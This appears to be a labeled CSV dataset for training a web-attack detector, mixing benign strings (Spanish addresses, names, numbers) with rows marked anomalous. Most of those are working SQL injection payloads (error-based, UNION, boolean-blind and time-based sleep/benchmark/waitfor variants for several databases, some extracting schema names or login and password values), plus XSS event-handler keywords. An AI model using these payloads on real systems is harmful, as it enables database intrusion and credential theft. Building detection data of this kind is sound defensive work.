payload,label
onpagehide@XSS Keys,anom
onpageshow@XSS Keys,anom
onplay@XSS Keys,anom
onplaying@XSS Keys,anom
onratechange@XSS Keys,anom
onseeked@XSS Keys,anom
onseeking@XSS Keys,anom
onsuspend@XSS Keys,anom
onwaiting@XSS Keys,anom
onwheel@XSS Keys,anom
http://@XSS Keys,anom
c/ caridad s/n,norm
"campello, el",norm
40184,norm
1.44E+15,norm
nue37,norm
nuda drudes,norm
tufts3@joll.rs,norm
22997112x,norm
"c/ del ferrocarril, 152,",norm
arenas de san juan,norm
19245,norm
2.07E+15,norm
fennell,norm
d50allecido,norm
1902,norm
genny,norm
03248i367ca,norm
"(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))",anom
"'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'",anom
"AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-",anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--",anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--",anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--",anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--",anom
"' and updatexml(null,concat(0x0a,version()),null)-- -",anom
"' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -",anom
"?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--",anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--",anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--",anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--",anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--",anom
"convert(int,@@version)",anom
cast((SELECT @@version) as int),anom
"' + convert(int,@@version) + '",anom
' + cast((SELECT @@version) as int) + ',anom
SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual,anom
"SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual",anom
"SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual",anom
"SELECT to_char(dbms_xmlgen.getxml('select ""'||(select user from sys.dual)||'"" FROM sys.dual')) FROM dual",anom
"SELECT rtrim(extract(xmlagg(xmlelement(""s"", username || ',')),'/s').getstringval(),',') FROM all_users",anom
",cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)",anom
",cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--",anom
",cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--",anom
",cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)",anom
"' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",anom
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1,anom
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1,anom
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1,anom
SELECT name FROM master..sysdatabases,anom
SELECT name FROM Injection..sysobjects WHERE xtype = 'U',anom
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users'),anom
"SELECT  UserId, UserName from Users",anom
"1' UNION SELECT 1,2,3--+",anom
"1' UNION SELECT @,@,@--+",anom
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%',anom
"WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)",anom
SELECT message FROM data WHERE row = 1 and message like 't%',anom
"?id=1 and substring(version(),1,1)=5",anom
"?id=1 and right(left(version(),1),1)=5",anom
"?id=1 and left(version(),1)=4",anom
"?id=1 and ascii(lower(substr(Version(),1,1)))=51",anom
"?id=1 and (select mid(version(),1,1)=4)",anom
"?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'",anom
"?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'",anom
"2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",anom
"2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2",anom
"AND MAKE_SET(YOLO<(SELECT(length(version()))),1)",anom
"AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)",anom
"AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)",anom
"AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)",anom
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';,anom
SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';,anom
SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual),anom
SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);,anom
SELEC COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';,anom
SELEC message FROM log_table WHERE rownum=1 AND message LIKE 't%';,anom
ProductID=1;waitfor delay '0:0:10'--,anom
ProductID=1);waitfor delay '0:0:10'--,anom
ProductID=1';waitfor delay '0:0:10'--,anom
ProductID=1');waitfor delay '0:0:10'--,anom
ProductID=1));waitfor delay '0:0:10'--,anom
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]',anom
"+BENCHMARK(40000000,SHA1(1337))+",anom
"'%2Bbenchmark(3200,SHA1(1))%2B'",anom
"AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1",anom
RLIKE SLEEP([SLEEPTIME]),anom
"OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))",anom
1 and (select sleep(10) from dual where database() like '%')#,anom
1 and (select sleep(10) from dual where database() like '___')# ,anom
1 and (select sleep(10) from dual where database() like '____')#,anom
1 and (select sleep(10) from dual where database() like '_____')#,anom
1 and (select sleep(10) from dual where database() like 'a____')#,anom
1 and (select sleep(10) from dual where database() like 's____')#,anom
1 and (select sleep(10) from dual where database() like 'sa___')#,anom
1 and (select sleep(10) from dual where database() like 'sw___')#,anom
1 and (select sleep(10) from dual where database() like 'swa__')#,anom
1 and (select sleep(10) from dual where database() like 'swb__')#,anom
1 and (select sleep(10) from dual where database() like 'swi__')#,anom
